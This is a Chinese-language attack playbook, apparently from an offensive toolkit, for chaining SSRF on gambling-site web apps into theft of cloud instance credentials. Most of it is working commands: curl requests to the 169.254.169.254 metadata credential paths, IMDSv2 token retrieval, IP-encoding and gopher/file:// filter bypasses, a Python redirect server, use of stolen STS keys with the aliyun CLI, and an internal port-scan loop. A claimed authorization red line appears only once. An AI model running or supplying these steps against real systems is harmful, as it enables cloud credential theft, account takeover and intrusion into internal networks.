# 云元数据 SSRF 利用链手法

> 更新：2026-08-13  
> 工具：`炼蛊房/ssrf_probe.py` · `curl` · Python3  
> 适用：阿里云 ECS / 腾讯云 CVM / AWS EC2 / 华为云 ECS 部署的博彩站  
> 红线：目标在 `授权范围`；不扩进元数据暴露的无关第三方服务。

---

## 0. 什么是云元数据 SSRF

云主机内置元数据服务 `169.254.169.254`（Link-local），**只对实例本身可访问**。  
如果 Web 应用存在 SSRF，可通过它打到元数据接口 → 拿实例角色绑定的临时 AK/SK。  
整条链：`SSRF 入口 → 169.254.169.254 → 角色 Token → 云 API 权限`

## 1. 找 SSRF 入口

### 1.1 常见参数名

```
url= / imageUrl= / src= / link= / redirect= / callback= / proxy= / target=
fetch= / load= / path= / file= / api= / endpoint= / wsdl= / next= / returnUrl=
```

### 1.2 快速探测

```bash
# 用引擎内置探针
python3 炼蛊房/ssrf_probe.py \
  --base https://授权站 \
  --case <案卷> \
  --out 案卷/<案卷>/案卷/ssrf/

# 手动测试单个参数
curl -sk "https://目标/api/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer <token>"
```

### 1.3 博彩站高发位置

| 功能 | 参数位置 |
|------|----------|
| 头像/图片上传 URL | `POST /user/avatar` → `avatarUrl` |
| 分享链接预览 | `GET /share/preview?url=` |
| 代理商跳转 | `GET /agent/redirect?target=` |
| 第三方支付回调验证 | `POST /pay/notify` → `notifyUrl` |
| PDF/截图服务 | `POST /report/gen` → `pageUrl` |
| Webhook 配置 | `POST /admin/webhook` → `url` |

## 2. 阿里云元数据读取

```bash
# 基础路径（通用，不需要 Token）
SSRF_BASE="http://169.254.169.254"

# 阿里云旧版（直接读，无需 Token）
curl "http://目标/ssrf接口?url=$SSRF_BASE/latest/meta-data/"
curl "http://目标/ssrf接口?url=$SSRF_BASE/latest/meta-data/ram/security-credentials/"
# → 返回角色名，如 AliyunECSImageExportDefaultRole

# 读临时 AK/SK/Token（最关键）
ROLE="AliyunECSImageExportDefaultRole"  # 替换为上一步拿到的角色名
curl "http://目标/ssrf接口?url=$SSRF_BASE/latest/meta-data/ram/security-credentials/$ROLE"
```

返回示例：
```json
{
  "AccessKeyId": "STS.NTe...",
  "AccessKeySecret": "xxxx",
  "SecurityToken": "CAIS...",
  "Expiration": "2026-08-13T18:00:00Z",
  "LastUpdated": "2026-08-13T12:00:00Z",
  "Code": "Success"
}
```

### 2.1 阿里云新版（需要先拿 Token，IMDSv2）

```bash
# Step1: 拿 TTL Token（通过 PUT）
# 如果 SSRF 不支持 PUT，回退旧版路径
TOKEN=$(curl -s -X PUT "http://目标/ssrf接口?url=$SSRF_BASE/latest/api/token" \
  -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600" 2>/dev/null)

# Step2: 带 Token 读（如果 SSRF 能带自定义 header）
curl "http://目标/ssrf接口?url=$SSRF_BASE/latest/meta-data/ram/security-credentials/" \
  -H "X-aliyun-ecs-metadata-token: $TOKEN"
```

> 新版强制 Token 的实例：旧版路径返回 401。此时看 SSRF 是否支持自定义 header，或找其它方向。

## 5. 绕过常见过滤

### 5.1 IP 地址变换

```
# 十进制
http://2130706433/  → 127.0.0.1
http://2852039166/  → 169.254.169.254

# 八进制
http://0251.0376.0251.0376/

# 十六进制
http://0xa9fea9fe/

# URL 编码
http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/

# IPv6 映射
http://[::ffff:169.254.169.254]/

# 短链 / DNS 重绑定（目标检测域名而非 IP）
# 用 1u.ms 等服务做 SSRF 绑定
```

### 5.2 协议变换

```
# 如果过滤了 http://169.x，换成：
file:///etc/passwd          （读本地文件）
dict://169.254.169.254:80/  （dict 协议）
gopher://169.254.169.254:80/_GET /latest/meta-data/ HTTP/1.0%0a%0a
```

### 5.3 重定向绕过

```python
# 自建重定向服务（有外网服务器时）
# server.py
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header("Location","http://169.254.169.254/latest/meta-data/")
        self.end_headers()
HTTPServer(("0.0.0.0",8080),H).serve_forever()
# 用 tools/tunnel-kit 出口后，让目标访问你的重定向服务
```

## 6. 拿到 STS Token 后接 AK 利用链

```bash
export ALICLOUD_ACCESS_KEY="STS.NTe..."
export ALICLOUD_SECRET_KEY="xxxx"
export SECURITY_TOKEN="CAIS..."

# 验证身份
aliyun sts GetCallerIdentity \
  --access-key-id "$ALICLOUD_ACCESS_KEY" \
  --access-key-secret "$ALICLOUD_SECRET_KEY" \
  --sts-token "$SECURITY_TOKEN" \
  --region cn-hangzhou
```

## 7. 无元数据时的降级路径

| 情况 | 降级 |
|------|------|
| 403 / 连不上 169.254 | SSRF 打内网其它服务（Redis / RDS / 内网 Admin） |
| 实例无绑定角色 | 读 `/latest/meta-data/` 找实例 ID / 内网 IP，辅助侦察 |
| 仅支持 HTTPS SSRF | 试 file:// 读本地敏感文件（/etc/environment / /proc/self/environ） |
| 完全过滤 169.254 | 找其它 SSRF 靶（内网 RDS 端口 / Nacos / 宝塔 8888） |

## 8. 内网 SSRF（非元数据）

```bash
# 扫内网存活（利用 SSRF 遍历响应长度/时间差）
for ip in 10.0.0.{1..30} 172.16.0.{1..20}; do
  LEN=$(curl -sk --max-time 2 "http://目标/ssrf?url=http://$ip:8888/" | wc -c)
  [ "$LEN" -gt 100 ] && echo "存活: $ip:8888 ($LEN bytes)"
done

# 常见内网端口
# 8888 宝塔  3306 MySQL  6379 Redis  8080/8090 业务后台  2181 ZooKeeper
# 8848 Nacos  9200 ES  5601 Kibana
```

## 证据落案卷

```bash
CASE="yzgj666_20260811"
mkdir -p "案卷/$CASE/evidence/ssrf/"

# 保存元数据响应
curl "http://目标/ssrf?url=http://169.254.169.254/latest/meta-data/" \
  -o "案卷/$CASE/evidence/ssrf/metadata_root.txt"

# 保存 STS Token（脱敏后写 STATUS）
```

STATUS 写入模板：

```
## HH:MM SSRF → 云元数据
- 入口: POST /api/fetch?url=（imageUrl 参数）
- 目标: 169.254.169.254/latest/meta-data/
- 角色: AliyunECSXxx
- AK: STS.xxx（脱敏，有效至 HH:MM）
- 下一刀: 阿里云AK-SK利用完整链 → ECS RunCommand
```
